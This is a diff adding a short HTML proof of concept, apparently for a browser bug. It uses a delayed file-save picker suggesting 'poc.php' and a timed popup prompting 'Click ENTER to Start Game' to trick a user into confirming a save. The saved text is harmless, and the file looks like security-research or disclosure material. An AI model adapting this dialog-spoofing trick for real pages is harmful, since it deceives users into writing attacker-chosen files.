@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hold Gesture Test</title>
+</head>
+
+<body>
+
+<h1>Click Anywhere</h1>
+
+<script>
+let popup;
+let timer;
+let holding = false;
+let pickerStarted = false;
+
+const btn = document.getElementById("btn");
+
+addEventListener("mousedown", () => {
+
+  setTimeout(async () => {
+
+    try {
+
+      const handle = await window.showSaveFilePicker({
+        suggestedName: "poc.php",
+        types: [{
+          description: "Text Files",
+          accept: {
+            "text/plain": [".php"]
+          }
+        }]
+      });
+
+      const writable = await handle.createWritable();
+
+      await writable.write("Hello from hold gesture");
+
+      await writable.close();
+
+      console.log("saved");
+
+    } catch (e) {
+
+      console.error("picker failed", e);
+
+    }
+
+  }, 2000);
+
+});
+
+addEventListener("mouseup", () => {
+
+  setTimeout(() => {
+    popup = window.open("about:blank","_blank","width=1600,height=800");
+
+    popup.document.write(`
+      <h1>Click ENTER to Start Game</h1>
+    `);
+
+  }, 2050);
+
+});
+  
+</script>
+
+</body>
+</html>
